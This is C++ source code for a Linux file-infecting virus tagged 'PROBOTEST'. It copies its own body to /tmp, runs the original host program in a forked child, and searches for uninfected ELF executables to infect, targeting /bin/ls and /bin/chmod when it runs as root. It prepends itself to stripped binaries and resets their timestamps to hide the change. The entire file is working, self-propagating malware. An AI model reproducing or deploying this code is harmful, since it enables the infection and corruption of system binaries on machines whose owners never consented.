#include <iostream>
#include <fstream>
#include <unistd.h>

const char* IDENTIFIER = "PROBOTEST";
const int MYSIZE = 19524;

using namespace std;

char* which(char* w);

int main (int argc, char** argv) {
    pid_t childpid = fork();
    uid_t uid=getuid();
    srand(time(0));
    int c;
    string exe = "/tmp/", vir = "/tmp/", me = (string) argv[0], command;
    me = which(argv[0]);
    me = me.substr(0, me.size() - 1);
    for (int i = 0; i < 8; i++) {
        exe += (char) ((rand() % 26) + 65);
        vir += (char) ((rand() % 26) + 65);
    }
    if (childpid > 0) {
        ifstream fi(me);
        ofstream fv(vir);
        if (fi.is_open() && fv.is_open()) {
            for (int i = 0; i < MYSIZE; i++) fv << (char) fi.get();
            fv.close();
            fi.close();
        }
    }
    if (childpid == 0) {
        ifstream fi(me);
        ofstream fo(exe);
        fi.seekg(MYSIZE, fi.beg);
        while ((c = fi.get()) != -1) fo << (char) c;
        fo.close();
        fi.close();
        command = "2>/dev/null chmod u+x ";
        command += exe;
        c = system( command.c_str() );
        c = execv((exe).c_str(), argv);
        return 30;
    }
    if (childpid > 0) {
        command = "[ -e /tmp/busgr ] || cp /bin/grep /tmp/busgr; \
[ -e /tmp/busmv ] || cp /bin/mv /tmp/busmv; \
[ -e /tmp/busca ] || cp /bin/cat /tmp/busca; \
[ -e /tmp/busch ] || cp /bin/chmod /tmp/busch; \
[ -e /tmp/busec ] || cp /bin/echo /tmp/busec; \
[ -e /tmp/busrm ] || cp /bin/rm /tmp/busrm; ";
        command += "VIR=$(for n in `find ";
        if (uid == 0) command += "/bin/ ";
        command += "-mindepth 1 -maxdepth 1 -type f";
        if (uid == 0) command += " | egrep '^ls$|^chmod$'";
        command += "`; \
do \
file $n | /tmp/busgr -q ELF && ( \
/tmp/busgr -q PROBOTEST $n || ( \
/tmp/busec \"$n\" \
) \
); \
done | tail -1); \
if [ ! -z \"$VIR\" ]; then \
file $VIR | /tmp/busgr -q stripped$ && (\
/tmp/busmv $VIR ${VIR}__ && \
/tmp/busca ";
        command += vir;
        command += " ${VIR}__ >$VIR && \
/tmp/busch ugo+x $VIR && \
touch -r ${VIR}__ $VIR \
) \
fi; \
/tmp/busrm -f ${VIR}__ ";
        command += vir;
        command += " ";
        command += exe;
        c = system( (command).c_str() );
        return 0;
    }
}

char* which(char* w) {
    string command = "/usr/bin/which ";
    command += w;
    FILE* which_fp = popen((command).c_str(), "r");
    char buffer[1024];
    char* output = fgets(buffer, sizeof(buffer), which_fp);
    pclose(which_fp);
    return output;
}